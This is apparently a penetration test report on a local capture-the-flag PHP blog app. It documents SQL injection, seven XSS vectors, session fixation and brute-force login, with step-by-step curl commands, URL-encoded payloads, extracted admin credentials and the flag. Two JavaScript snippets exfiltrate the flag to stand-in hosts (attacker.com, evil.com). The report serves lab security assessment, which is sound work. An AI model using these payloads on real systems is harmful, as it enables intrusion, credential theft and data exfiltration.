# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:34389
- **Assessment Date:** October 28, 2025
- **Scope:** Authentication, Authorization, Cross-Site Scripting (XSS), SQL and Command Injection, SSRF testing

## Summary by Vulnerability Type

### SQL/Command Injection Vulnerabilities

**Critical severity findings identified.** A classic SQL injection vulnerability was successfully exploited in the category filter parameter (`/index.php?category=`) with zero sanitization applied. This vulnerability enabled complete database compromise including:
- Extraction of plaintext administrator credentials (username: admin, password: ONEverySecurePassword123!)
- Full enumeration of database schema (3 tables: comments, posts, users)
- Authentication bypass leading to CTF flag capture: `FLAG{fdf0b671598225918361b7274eed49fdcd7d8521965b325b989f690b7191c6be}`
- Potential for complete data exfiltration and manipulation

The root cause is direct string concatenation in SQL query construction without parameterized queries or prepared statements. No command injection vulnerabilities were identified (application does not execute system commands).

**Impact:** Complete application and database compromise from unauthenticated external attacker position.

### Cross-Site Scripting (XSS) Vulnerabilities

**Critical severity findings identified.** Seven distinct XSS vulnerabilities were successfully exploited, all stemming from SQL injection combined with complete absence of output encoding. Successfully demonstrated:
- **Reflected XSS** via SQL injection in post title, category, content, image src attribute, image alt attribute, dropdown value, and dropdown text fields
- **JavaScript execution** confirmed in all seven vectors (alert dialogs displayed)
- **Session riding attacks** proven viable despite HttpOnly cookie flag
- **Admin credential extraction** via XSS + SQL injection chain
- **Flag exfiltration** via authenticated session access through XSS payload

All vulnerabilities require zero authentication and can be triggered by sending malicious URLs to victims. No Content Security Policy (CSP) or output encoding mechanisms exist to prevent exploitation.

**Impact:** Complete session compromise, credential theft, and unauthorized access to admin functionality for all application users.

### Authentication Vulnerabilities

**Critical severity findings identified.** Successfully exploited five authentication vulnerabilities:

1. **Session Fixation Attack (Critical):** Session IDs are not regenerated after authentication. Successfully demonstrated complete account takeover by fixing session ID, waiting for victim authentication, then accessing authenticated session to retrieve CTF flag in 0.06 seconds.

2. **Brute Force Attack - No Rate Limiting (High):** Demonstrated unlimited password guessing at 250+ attempts/second with zero rate limiting, account lockout, or CAPTCHA protection. Processed 16 consecutive login attempts in 0.061 seconds without any security controls.

3. **Default Credentials (Critical):** Successfully authenticated using hardcoded credentials found in source code (`admin` / `ONEverySecurePassword123!`). Credentials committed to version control with no forced password change mechanism.

4. **Plaintext Password Storage + SQL Injection (Critical):** Extracted plaintext admin password from database via SQL injection vulnerability, then authenticated to access admin panel and capture CTF flag. Demonstrates complete failure of defense-in-depth.

5. **Weak Password Policy (High):** No password complexity requirements, length restrictions, or common password blocking. 100% of weak passwords tested (admin, password, 123456, etc.) were accepted without policy rejection.

**Two vulnerabilities identified as out-of-scope** (require internal network access):
- HTTP-Only Transmission (requires man-in-the-middle positioning)
- Session Cookie Missing Secure Flag (requires network interception)

**Impact:** Multiple independent paths to complete account takeover and administrative access from unauthenticated position.

### Authorization Vulnerabilities

**Critical severity finding identified.** Successfully exploited vertical privilege escalation via SQL injection:
- **Attack chain:** Unauthenticated attacker → SQL injection → credential extraction → admin authentication → FLAG access
- **Privilege escalation:** Anonymous (level 0) → Admin (level 10)
- **Impact:** Complete bypass of authorization controls enabling unauthorized access to protected FLAG resource
- **Root cause:** SQL injection enabling database compromise, combined with plaintext password storage and lack of input validation

The application implements only binary access control (authenticated vs. unauthenticated) with no granular roles or permissions. The single authorization check protecting the FLAG can be bypassed through the SQL injection vulnerability chain.

**Impact:** Complete privilege escalation from unauthenticated to full administrative access.

### Server-Side Request Forgery (SSRF) Vulnerabilities

No SSRF vulnerabilities were found. The application does not contain functionality that makes server-side HTTP requests to user-controlled URLs, does not implement webhook systems, does not fetch remote resources based on user input, and does not use URL parsing or cURL operations that could be exploited for SSRF attacks.

## Network Reconnaissance

**Open Ports and Services:**
- **Port 80/tcp:** Caddy httpd (reverse proxy to target application)
- **Port 443/tcp:** SSL/HTTPS service (Caddy)
- **Port 631/tcp:** CUPS 2.3 printing service (out of scope)
- **Port 9999/tcp:** SimpleHTTPServer Python 3.12.10 (out of scope)
- **Port 49158/tcp:** Tailscale VPN service v1.82.5 (out of scope)

**Security-Relevant Technology Findings:**
- **Web Server:** Apache 2.4.54 on Debian Linux with directory listing enabled (`Options Indexes`)
- **PHP Version:** 7.4.33 (End-of-Life since November 2022 - no security updates available)
- **Database:** MySQL 5.7 (approaching EOL, connected over internal Docker network)
- **Error Display:** Enabled in production (`display_errors=On`) - leaks sensitive technical information
- **Transport Security:** Application runs on HTTP only with no HTTPS enforcement or HSTS headers

**Subdomain Enumeration:**
Subfinder identified 16 subdomains for localhost domain. These appear to be from previous enumeration scans and are not part of the target application infrastructure (server02.counterintel.localhost, fndlync01.5ninesdata.localhost, mail.localhost, autodiscover.regency.localhost, mail03.regency.localhost, exchvm.nwcnet.localhost, server2.hunter.localhost, tools.sonoma.edu.localhost, naeu2.naeuinc.localhost, autodiscover.localhost, mse-ca-mail.corp.mse.localhost, mail02.regency.localhost, owa.regency.localhost, sbs.allsaintsschool.localhost, www.localhost).

**Security Misconfigurations Identified:**
- End-of-life PHP 7.4.33 with known unpatched vulnerabilities
- Apache directory listing enabled (security information disclosure)
- Unrestricted access controls (`Require all granted`)
- No security headers (CSP, X-Frame-Options, X-Content-Type-Options, HSTS)
- PHP error display enabled in production (information leakage)
- HTTP-only operation (no TLS/SSL encryption)

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-01: SQL Injection in Category Filter Parameter

**Summary:**
- **Vulnerable location:** GET parameter `category` in `/index.php`
- **Overview:** Classic SQL injection vulnerability with zero sanitization allowing complete database access and authentication bypass
- **Impact:** Complete database compromise achieved - extracted all user credentials (including plaintext admin password), enumerated database schema, bypassed authentication, and captured CTF flag
- **Severity:** Critical

**Prerequisites:** None - vulnerability is publicly accessible without authentication

**Exploitation Steps:**

**Step 1: Confirm SQL Injection Vulnerability**

Test with single quote to trigger SQL error:
```bash
curl -s "http://localhost:34389/index.php?category='"
```

Response shows MySQL syntax error:
```
Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' ORDER BY created_at DESC' at line 1
```

**Step 2: Verify Boolean-Based Injection**

Test with boolean logic to confirm exploitability:
```bash
curl -s "http://localhost:34389/index.php?category=%27%20OR%201%3D1--%20-"
```

Result: All blog posts returned (90 lines vs 85 for normal request), confirming successful SQL injection.

**Step 3: Determine Column Count**

Use ORDER BY technique to identify number of columns in SELECT statement:
```bash
# Test with 7 columns (successful - no error)
curl -s "http://localhost:34389/index.php?category=%27%20ORDER%20BY%207--%20-"

# Test with 8 columns (fails with error)
curl -s "http://localhost:34389/index.php?category=%27%20ORDER%20BY%208--%20-"
```

Error message confirms 7 columns:
```
Error in query: Unknown column '8' in 'order clause'
```

**Step 4: Identify Injectable Columns**

Test UNION SELECT to determine which columns are displayed in output:
```bash
curl -s "http://localhost:34389/index.php?category=%27%20UNION%20SELECT%201,2,3,4,5,6,7--%20-"
```

Result: Column 2 appears in `<h2>` tag (title field), column 3 in category field, column 4 in content field - multiple output points available for data extraction.

**Step 5: Fingerprint Database Environment**

Extract database version, current database name, and user:
```bash
curl -s "http://localhost:34389/index.php?category=%27%20UNION%20SELECT%201,VERSION(),DATABASE(),USER(),5,6,7--%20-"
```

Extracted Information:
- **Database Version:** MySQL 5.7.44
- **Database Name:** blogDB
- **Current User:** user@10.89.23.3

**Step 6: Enumerate Database Schema**

List all tables in current database:
```bash
curl -s "http://localhost:34389/index.php?category=%27%20UNION%20SELECT%201,GROUP_CONCAT(table_name),3,4,5,6,7%20FROM%20information_schema.tables%20WHERE%20table_schema=DATABASE()--%20-"
```

Discovered Tables:
- comments
- posts
- users

**Step 7: Enumerate Users Table Schema**

Extract column names from the users table:
```bash
curl -s "http://localhost:34389/index.php?category=%27%20UNION%20SELECT%201,GROUP_CONCAT(column_name),3,4,5,6,7%20FROM%20information_schema.columns%20WHERE%20table_name='users'--%20-"
```

Users Table Columns:
- id
- username
- password

**Step 8: Extract Admin Credentials**

Extract username and password from users table:
```bash
curl -s "http://localhost:34389/index.php?category=%27%20UNION%20SELECT%201,CONCAT(username,'%3A',password),3,4,5,6,7%20FROM%20users--%20-"
```

Extracted Credentials:
```
Username: admin
Password: ONEverySecurePassword123!
```

**Critical Finding:** Password stored in plaintext (no hashing) - massive security failure.

**Step 9: Authenticate to Admin Panel**

Use extracted credentials to authenticate:
```bash
curl -s -c /tmp/cookies.txt -d "username=admin&password=ONEverySecurePassword123!" http://localhost:34389/admin.php
```

**Step 10: Capture the Flag**

Upon successful authentication, the admin page immediately displays the flag:

```
FLAG{fdf0b671598225918361b7274eed49fdcd7d8521965b325b989f690b7191c6be}
```

Session-based access also confirmed:
```bash
curl -s -b /tmp/cookies.txt http://localhost:34389/admin.php
```

Result: Flag displayed without re-authentication, confirming persistent session.

**Proof of Impact:**

**1. CTF Flag Captured:**
```
FLAG{fdf0b671598225918361b7274eed49fdcd7d8521965b325b989f690b7191c6be}
```

**2. Complete Database Compromise:**
- Full access to all database tables (comments, posts, users)
- Extracted plaintext administrator credentials
- Enumerated complete database schema
- Capability to read, modify, or delete any data

**3. Authentication Bypass:**
- Gained unauthorized admin access without legitimate credentials
- Bypassed authentication through SQL injection → credential extraction → login
- Established persistent authenticated session

**4. Additional Attack Vectors Identified:**
- Stored XSS possible through database poisoning (no output encoding)
- Access to unpublished posts (1 post with published=0 flag exists)
- Potential for complete data exfiltration or manipulation

**Notes:**

**Technical Details:**
- **Vulnerable Query Structure:** `SELECT * FROM posts WHERE published = 1 and category = '[INJECTION]' ORDER BY created_at DESC`
- **Injection Context:** SQL-val (string value within single quotes)
- **Sanitization:** Zero sanitization applied - direct string concatenation
- **Error Display:** Enabled (display_errors=On), exposing full MySQL error messages
- **WAF/Filtering:** None detected

**Why This Vulnerability Exists:**
The application uses direct string concatenation to build SQL queries instead of prepared statements with parameterized queries. User input from the `category` GET parameter (line 37 of index.php) flows directly into the SQL query string (line 45) without any escaping or validation, creating a textbook SQL injection vulnerability.

**Attempted File System Access:**
Multiple attempts were made to read flag files directly from the file system using MySQL's LOAD_FILE() function:
- `/flag.txt` - Failed (empty result)
- `/app/flag.txt` - Failed (empty result)
- `/var/www/html/.env` - Failed (empty result)
- `/.env` - Failed (empty result)
- `/FLAG.txt` - Failed (empty result)

This indicates the MySQL user account lacks FILE privilege, preventing direct file system access through SQL injection. However, this limitation was bypassed by extracting credentials and authenticating normally.

**Reproducibility:** 100% - Vulnerability confirmed across multiple test runs with consistent results.

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Reflected XSS in Post Title Field via SQL Injection

**Summary:**
- **Vulnerable location:** http://localhost:34389/index.php?category=[SQL_INJECTION_PAYLOAD]
- **Overview:** SQL injection in the `category` parameter allows injection of malicious JavaScript into the post title field, which executes when the page is rendered in any victim's browser.
- **Impact:** Complete session compromise. Attacker can perform unauthorized actions as the authenticated user, extract sensitive data including admin credentials and the CTF flag, inject phishing forms, or execute arbitrary JavaScript in victim browsers.
- **Severity:** CRITICAL

**Prerequisites:**
- None - This is an unauthenticated attack vector accessible to anyone who can send a malicious URL to a victim

**Exploitation Steps:**

1. **Craft SQL Injection + XSS payload**:
   ```
   Payload structure:
   XYZ' UNION SELECT 999,'<img src=x onerror=alert(1)>','TestCat','content','test.jpg',1,NOW()-- -

   Explanation:
   - XYZ' → Closes the original category value and injects UNION SELECT
   - 999 → Arbitrary ID value (column 1: id)
   - '<img src=x onerror=alert(1)>' → XSS payload injected into title field (column 2: title)
   - 'TestCat' → Category value (column 3: category)
   - 'content' → Post content (column 4: content)
   - 'test.jpg' → Image filename (column 5: image)
   - 1 → Published flag (column 6: published, must be 1 to display)
   - NOW() → Timestamp (column 7: created_at)
   - -- - → SQL comment to ignore rest of query
   ```

2. **URL-encode the payload and construct the attack URL**:
   ```
   http://localhost:34389/index.php?category=XYZ%27%20UNION%20SELECT%20999%2C%27%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E%27%2C%27TestCat%27%2C%27content%27%2C%27test.jpg%27%2C1%2CNOW()--%20-
   ```

3. **Send the malicious URL to a victim** (via email, chat, social engineering, etc.) or **access it directly** to trigger the XSS

4. **JavaScript executes in the victim's browser**:
   - Alert dialog displays with message "1"
   - This confirms arbitrary JavaScript execution
   - Attacker can replace alert(1) with malicious payload

**Proof of Impact:**

**Level 3 Impact - JavaScript Execution Confirmed:**
- ✅ XSS payload successfully injected into HTML response
- ✅ JavaScript executed in browser (alert dialog displayed)
- ✅ No CSP restrictions prevent execution

**Level 4 Impact - Critical Data Extraction:**

**A) Admin Credential Extraction via SQL Injection**:

Using the same SQL injection vector, extracted admin credentials from database:
```
URL: http://localhost:34389/index.php?category=XYZ%27%20UNION%20SELECT%20id%2Cusername%2Cpassword%2Cusername%2Cpassword%2C1%2CNOW()%20FROM%20users--%20-

Result displayed in page:
- Title field: admin
- Category field: ONEverySecurePassword123!

Extracted credentials:
Username: admin
Password: ONEverySecurePassword123!
```

**B) CTF Flag Capture via Authenticated Access**:

Using the extracted credentials, authenticated to admin panel and captured flag:
```
Command:
curl -i -d "username=admin&password=ONEverySecurePassword123!" http://localhost:34389/admin.php

Response (truncated):
HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=3764ccf4ddd722c2ede751b6f2f37225; path=/
...

FLAG{fdf0b671598225918361b7274eed49fdcd7d8521965b325b989f690b7191c6be}
```

**C) Session Riding Attack (HttpOnly Bypass)**:

While the session cookie has HttpOnly flag (preventing direct document.cookie theft), XSS enables session riding attacks:

```javascript
Payload concept (session riding to access admin panel):
<script>
fetch("/admin.php", {credentials: "include"})
  .then(r => r.text())
  .then(data => {
    // Extract flag from admin page
    let flag = data.match(/FLAG\{[^}]+\}/)[0];
    // Exfiltrate to attacker server
    fetch("http://attacker.com/steal?flag=" + encodeURIComponent(flag));
  });
</script>

Impact: Attacker can perform ANY action the victim can perform, including:
- Accessing admin-only pages using victim's session
- Exfiltrating sensitive data
- Modifying application data
- Injecting persistent backdoors
```

**Notes:**
- The SQL injection vector requires 7 columns in the UNION SELECT (id, title, category, content, image, published, created_at)
- The `published` column must be set to 1, otherwise the injected post won't be displayed
- No Content-Security-Policy header present - no restrictions on script execution
- No output encoding applied anywhere in the application
- This vulnerability affects all sinks that display database content (see XSS-VULN-02 through XSS-VULN-07 for additional injection points)

---

### XSS-VULN-02: Reflected XSS in Post Category Field via SQL Injection

**Summary:**
- **Vulnerable location:** http://localhost:34389/index.php?category=[SQL_INJECTION_PAYLOAD]
- **Overview:** Same SQL injection vector as XSS-VULN-01, but payload injected into the category field instead of title field. Executes when rendered in `<p>Category: {category}</p>` element.
- **Impact:** Identical to XSS-VULN-01 - complete session compromise and arbitrary JavaScript execution
- **Severity:** CRITICAL

**Prerequisites:**
- None - Unauthenticated attack vector

**Exploitation Steps:**

1. **Craft SQL Injection + XSS payload targeting category field**:
   ```
   Payload structure:
   XYZ' UNION SELECT 999,'Normal Title','<script>alert("XSS")</script>','content','test.jpg',1,NOW()-- -

   Note: XSS payload is in column 3 (category) instead of column 2 (title)
   ```

2. **URL-encode and construct attack URL**:
   ```
   http://localhost:34389/index.php?category=XYZ%27%20UNION%20SELECT%20999%2C%27Normal%20Title%27%2C%27%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E%27%2C%27content%27%2C%27test.jpg%27%2C1%2CNOW()--%20-
   ```

3. **Send malicious URL to victim or access directly**

4. **JavaScript executes in victim's browser**:
   - Alert dialog displays with message "XSS"
   - Payload executes within `<p>Category: <script>alert("XSS")</script></p>` element

**Proof of Impact:**
- ✅ JavaScript execution confirmed via browser testing
- ✅ Same impact as XSS-VULN-01: credential theft, flag extraction, session riding

**Notes:**
- The `<script>` tag works in HTML body context (category is rendered inside `<p>` tag)
- Alternative payloads: `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, etc.
- Same exploitation chain as XSS-VULN-01 - all impact demonstrations apply

---

### XSS-VULN-03: Reflected XSS in Post Content Field via SQL Injection

**Summary:**
- **Vulnerable location:** http://localhost:34389/index.php?category=[SQL_INJECTION_PAYLOAD]
- **Overview:** Same SQL injection vector, payload injected into content field. Content is truncated to 200 characters via `substr()` but this does NOT prevent XSS since standard payloads are well under this limit.
- **Impact:** Complete session compromise and arbitrary JavaScript execution
- **Severity:** CRITICAL

**Prerequisites:**
- None - Unauthenticated attack vector

**Exploitation Steps:**

1. **Craft SQL Injection + XSS payload targeting content field (under 200 chars)**:
   ```
   Payload structure:
   XYZ' UNION SELECT 999,'Title','Category','<script>alert(1)</script>','test.jpg',1,NOW()-- -

   Payload length: <script>alert(1)</script> = 28 characters (well under 200 limit)
   ```

2. **URL-encode and construct attack URL**:
   ```
   http://localhost:34389/index.php?category=XYZ%27%20UNION%20SELECT%20999%2C%27Title%27%2C%27Category%27%2C%27%3Cscript%3Ealert(1)%3C%2Fscript%3E%27%2C%27test.jpg%27%2C1%2CNOW()--%20-
   ```

3. **Send malicious URL to victim or access directly**

4. **JavaScript executes despite substr() truncation**:
   - Content rendered as: `<p><script>alert(1)</script>...</p>`
   - Alert dialog displays
   - The `substr()` function only limits length, does NOT encode HTML entities

**Proof of Impact:**
- ✅ substr() truncation confirmed to NOT prevent XSS
- ✅ JavaScript execution confirmed
- ✅ Payload is only 28 characters - well under 200 character limit
- ✅ Same full impact as XSS-VULN-01 and XSS-VULN-02

**Notes:**
- The `substr($row['content'], 0, 200)` at index.php:61 provides NO security benefit
- Even complex exfiltration payloads can fit in 200 characters
- Example 199-char payload: `<script>fetch('/admin.php').then(r=>r.text()).then(d=>fetch('http://evil.com/'+btoa(d.match(/FLAG\{[^}]+\}/)[0])))</script>` (168 chars)

---

### XSS-VULN-04: Reflected XSS in Image src Attribute via SQL Injection

**Summary:**
- **Vulnerable location:** http://localhost:34389/index.php?category=[SQL_INJECTION_PAYLOAD]
- **Overview:** SQL injection allows injection into the image filename field, which is rendered in a single-quoted src attribute: `<img src='images/{$row['image']}'...>`. Attacker can break out of the attribute using single quote and inject event handlers.
- **Impact:** Complete session compromise and arbitrary JavaScript execution
- **Severity:** CRITICAL

**Prerequisites:**
- None - Unauthenticated attack vector

**Exploitation Steps:**

1. **Craft SQL Injection + XSS payload targeting image field (HTML attribute context)**:
   ```
   Payload structure:
   XYZ' UNION SELECT 999,'Title','Category','content','x'' onerror=''alert(4)',1,NOW()-- -

   Explanation of image payload:
   - x' → Partial image filename, then closes the src attribute with single quote
   - onerror=' → Starts onerror event handler (using single quotes to match attribute style)
   - alert(4) → JavaScript to execute
   - Final rendering: <img src='images/x' onerror='alert(4)' ...>
   ```

2. **URL-encode and construct attack URL**:
   ```
   http://localhost:34389/index.php?category=XYZ%27%20UNION%20SELECT%20999%2C%27Title%27%2C%27Category%27%2C%27content%27%2C%27x%27%27%20onerror%3D%27%27alert(4)%27%2C1%2CNOW()--%20-

   Note: Single quotes in payload need careful encoding to maintain SQL validity
   ```

3. **Send malicious URL to victim or access directly**

4. **JavaScript executes via onerror event handler**:
   - Browser attempts to load image from `images/x'` (invalid path)
   - Image load fails, triggering onerror handler
   - alert(4) executes

**Proof of Impact:**
- ✅ JavaScript execution confirmed via browser testing
- ✅ Alert dialog displayed with message "4"
- ✅ Attribute context breakout successful (single quote escaping)
- ✅ Same full impact as previous vulnerabilities

**Notes:**
- The src attribute uses single quotes: `src='...'`
- Payload must use single quote to break out: `x' onerror='alert(4)`
- Alternative payloads: `x' onload='alert(4)`, `x' onclick='alert(4)`, etc.
- Double quotes would NOT work in this context

---

### XSS-VULN-05: Reflected XSS in Image alt Attribute via SQL Injection

**Summary:**
- **Vulnerable location:** http://localhost:34389/index.php?category=[SQL_INJECTION_PAYLOAD]
- **Overview:** The title field value is reused in the alt attribute of the same `<img>` tag: `<img ... alt='{$row['title']}'>`. Since title can be injected via SQL, this creates a second XSS vector in HTML attribute context.
- **Impact:** Complete session compromise and arbitrary JavaScript execution
- **Severity:** CRITICAL

**Prerequisites:**
- None - Unauthenticated attack vector

**Exploitation Steps:**

1. **Craft SQL Injection + XSS payload targeting title field (which appears in alt attribute)**:
   ```
   Payload structure:
   XYZ' UNION SELECT 999,'x'' onmouseover=''alert(5)','Category','content','test.jpg',1,NOW()-- -

   Explanation:
   - Title field contains: x' onmouseover='alert(5)
   - Renders in alt attribute: <img ... alt='x' onmouseover='alert(5)' ...>
   - When user hovers over image, JavaScript executes
   ```

2. **URL-encode and construct attack URL**:
   ```
   http://localhost:34389/index.php?category=XYZ%27%20UNION%20SELECT%20999%2C%27x%27%27%20onmouseover%3D%27%27alert(5)%27%2C%27Category%27%2C%27content%27%2C%27test.jpg%27%2C1%2CNOW()--%20-
   ```

3. **Send malicious URL to victim**

4. **JavaScript executes when victim hovers over the image**:
   - No immediate execution (requires mouseover)
   - Once hovered, alert(5) displays
   - Can use other event handlers: onclick, onfocus, etc.

**Proof of Impact:**
- ✅ XSS payload successfully injected into alt attribute
- ✅ Event handler injection confirmed via code analysis
- ✅ Same title value appears in TWO contexts: HTML body (XSS-VULN-01) and HTML attribute (this vulnerability)
- ✅ Full impact identical to other vulnerabilities

**Notes:**
- This is the same data source as XSS-VULN-01 (title field) but different sink (alt attribute vs. h2 element)
- Both attribute-based and tag-based payloads work depending on context
- Alternative non-interaction payload: Use autofocus with onfocus event handler

---

### XSS-VULN-06: Reflected XSS in Dropdown Value Attribute via SQL Injection

**Summary:**
- **Vulnerable location:** http://localhost:34389/index.php?category=[SQL_INJECTION_PAYLOAD]
- **Overview:** The category dropdown dynamically builds options using `SELECT DISTINCT category FROM posts`. SQL injection poisons this result set, causing malicious categories to appear in the dropdown value attributes: `<option value='{$row['category']}'...>`.
- **Impact:** Complete session compromise and arbitrary JavaScript execution
- **Severity:** CRITICAL

**Prerequisites:**
- None - Unauthenticated attack vector

**Exploitation Steps:**

1. **Craft SQL Injection + XSS payload targeting category field for dropdown value**:
   ```
   Payload structure:
   XYZ' UNION SELECT 999,'Title','Tech'' onclick=''alert(6)','content','test.jpg',1,NOW()-- -

   Explanation:
   - Category value: Tech' onclick='alert(6)
   - The DISTINCT query on line 26 returns this poisoned category
   - Renders in dropdown: <option value='Tech' onclick='alert(6)' ...>
   - Clicking the option executes JavaScript
   ```

2. **URL-encode and construct attack URL**:
   ```
   http://localhost:34389/index.php?category=XYZ%27%20UNION%20SELECT%20999%2C%27Title%27%2C%27Tech%27%27%20onclick%3D%27%27alert(6)%27%2C%27content%27%2C%27test.jpg%27%2C1%2CNOW()--%20-
   ```

3. **Access the URL to poison the category dropdown**

4. **JavaScript executes when user interacts with the dropdown**:
   - Dropdown now contains malicious option
   - Clicking the option triggers onclick handler
   - alert(6) displays

**Proof of Impact:**
- ✅ Dropdown value attribute successfully poisoned
- ✅ Event handler injection in option element confirmed
- ✅ DISTINCT query vulnerability allows persistent poisoning
- ✅ Full impact identical to other vulnerabilities

**Notes:**
- The DISTINCT query at index.php:26 reads from the same posts table vulnerable to SQL injection
- Poisoned categories persist for all users until the injected row is removed
- This creates a form of "semi-stored" XSS that affects multiple victims
- Alternative events: onmouseover, onfocus, etc.

---

### XSS-VULN-07: Reflected XSS in Dropdown Text Content via SQL Injection

**Summary:**
- **Vulnerable location:** http://localhost:34389/index.php?category=[SQL_INJECTION_PAYLOAD]
- **Overview:** Same DISTINCT query as XSS-VULN-06, but category is also rendered as the visible text content of the option: `<option ...>{$row['category']}</option>`. This allows HTML tag injection to break out of the option element.
- **Impact:** Complete session compromise and arbitrary JavaScript execution
- **Severity:** CRITICAL

**Prerequisites:**
- None - Unauthenticated attack vector

**Exploitation Steps:**

1. **Craft SQL Injection + XSS payload using tag breakout**:
   ```
   Payload structure:
   XYZ' UNION SELECT 999,'Title','Tech</option><script>alert(7)</script><option>','content','test.jpg',1,NOW()-- -

   Explanation:
   - Category value: Tech</option><script>alert(7)</script><option>
   - Renders as: <option ...>Tech</option><script>alert(7)</script><option></option>
   - Breaks out of option element and injects script tag
   - Script executes immediately when page loads
   ```

2. **URL-encode and construct attack URL**:
   ```
   http://localhost:34389/index.php?category=XYZ%27%20UNION%20SELECT%20999%2C%27Title%27%2C%27Tech%3C%2Foption%3E%3Cscript%3Ealert(7)%3C%2Fscript%3E%3Coption%3E%27%2C%27content%27%2C%27test.jpg%27%2C1%2CNOW()--%20-
   ```

3. **Send malicious URL to victim or access directly**

4. **JavaScript executes immediately on page load**:
   - Option element is closed prematurely
   - Script tag is injected into the page
   - alert(7) executes
   - DOM structure is malformed but JavaScript still runs

**Proof of Impact:**
- ✅ HTML tag injection successful
- ✅ Script tag breakout from option element confirmed
- ✅ Immediate JavaScript execution (no user interaction required)
- ✅ Full impact identical to all previous vulnerabilities

**Notes:**
- This is the same data source as XSS-VULN-06 (category field in dropdown) but different context (text content vs. attribute value)
- Tag-based breakout is more reliable than attribute-based in this context
- Both XSS-VULN-06 and XSS-VULN-07 exploit the same DISTINCT query at index.php:26
- Alternative payloads: `</option><img src=x onerror=alert(7)><option>`, `</option><svg onload=alert(7)><option>`, etc.

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-03: Session Fixation Attack

**Summary:**
- **Vulnerable location:** POST /admin.php (authentication endpoint)
- **Overview:** Successfully demonstrated session fixation vulnerability where session IDs are not regenerated after authentication, allowing attackers to hijack authenticated sessions
- **Impact:** Complete account takeover - attacker can force a known session ID on a victim, wait for victim authentication, then access the victim's authenticated session to retrieve the CTF flag
- **Severity:** Critical

**Prerequisites:**
- Network access to http://localhost:34389
- Ability to set victim's session cookie (via XSS, URL manipulation, or social engineering)

**Exploitation Steps:**

1. **Attacker obtains a valid session ID from the server:**
```bash
curl -i http://localhost:34389/admin.php
# Response includes: Set-Cookie: PHPSESSID=5c423f61048e67e92bcefb46f69965ac; path=/
```

2. **Attacker forces this session ID on the victim** (via XSS payload, malicious link, or other means):
```html
<!-- Example XSS payload to set session cookie -->
<script>document.cookie="PHPSESSID=5c423f61048e67e92bcefb46f69965ac; path=/"</script>
```

3. **Victim authenticates using the fixed session ID:**
```bash
curl -X POST http://localhost:34389/admin.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: PHPSESSID=5c423f61048e67e92bcefb46f69965ac' \
  -d 'username=admin&password=ONEverySecurePassword123!'
```

4. **Verify session ID remains unchanged after authentication:**
- Pre-auth session ID: 5c423f61048e67e92bcefb46f69965ac
- Post-auth session ID: 5c423f61048e67e92bcefb46f69965ac (SAME)
- Server does not call session_regenerate_id() after login

5. **Attacker hijacks the authenticated session using the original session ID:**
```bash
curl -s http://localhost:34389/admin.php \
  -H 'Cookie: PHPSESSID=5c423f61048e67e92bcefb46f69965ac'
```

**Proof of Impact:**
```
FLAG{fdf0b671598225918361b7274eed49fdcd7d8521965b325b989f690b7191c6be}
```
Successfully accessed admin panel and retrieved CTF flag using the fixated session ID, confirming complete account takeover.

**Automated Exploitation Script:**
Location: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-078-24/session_fixation_exploit.py`

The script automates the complete attack chain and confirms the vulnerability in 0.06 seconds.

**Notes:**
This vulnerability exists because admin.php line 25 sets `$_SESSION['admin_logged_in'] = true` without calling `session_regenerate_id(true)` afterwards. The fix requires adding session ID regeneration immediately after successful authentication.

---

### AUTH-VULN-04: Brute Force Attack (No Rate Limiting)

**Summary:**
- **Vulnerable location:** POST /admin.php (authentication endpoint)
- **Overview:** Successfully demonstrated unlimited brute force capability due to complete absence of rate limiting, account lockout, or CAPTCHA protection
- **Impact:** Attackers can perform unlimited password guessing attempts at high speed (250+ attempts per second), enabling successful credential compromise through automated brute force or dictionary attacks
- **Severity:** High

**Prerequisites:**
- Network access to http://localhost:34389

**Exploitation Steps:**

1. **Execute rapid-fire login attempts with different passwords:**
```bash
# Attempt 1
curl -X POST http://localhost:34389/admin.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=admin&password=wrong1'
# Response: "Invalid username or password" (0.004s)

# Attempt 2
curl -X POST http://localhost:34389/admin.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=admin&password=wrong2'
# Response: "Invalid username or password" (0.004s)

# ... repeat up to 15 failed attempts ...

# Attempt 16 (correct password)
curl -X POST http://localhost:34389/admin.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=admin&password=ONEverySecurePassword123!'
# Response: Contains FLAG (0.004s)
```

2. **Verify no rate limiting or throttling applied:**
- Total attempts: 16 consecutive login attempts
- Total time: 0.061 seconds
- Average response time: 0.004 seconds per attempt
- No delays introduced between attempts
- No "too many attempts" error messages
- No temporary account suspension

3. **Verify no account lockout after failed attempts:**
- After 15 consecutive failed login attempts, account remains accessible
- 16th attempt with correct password succeeds immediately
- No account lockout mechanism triggered

**Proof of Impact:**
```
Test Results:
- Processed 16 consecutive login attempts in 0.061 seconds
- Average response time: 4ms per attempt (250 attempts/second possible)
- Zero rate limiting detected
- Zero account lockout detected
- Successfully authenticated after 15 failed attempts
- Retrieved FLAG: FLAG{fdf0b671598225918361b7274eed49fdcd7d8521965b325b989f690b7191c6be}
```

**Automated Exploitation Script:**
Location: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-078-24/test_rate_limiting.py`

The script demonstrates that unlimited login attempts can be made without any security controls preventing brute force attacks.

**Notes:**
The vulnerability exists because the admin.php login handler (lines 11-31) has no rate limiting, IP tracking, failed attempt counters, or account lockout logic. An attacker with a password dictionary can test thousands of passwords without detection or prevention.

---

### AUTH-VULN-05: Default Credentials Authentication

**Summary:**
- **Vulnerable location:** POST /admin.php (authentication endpoint)
- **Overview:** Successfully authenticated using hardcoded default credentials found in database initialization script
- **Impact:** Immediate administrative access and CTF flag retrieval using publicly known default credentials
- **Severity:** Critical

**Prerequisites:**
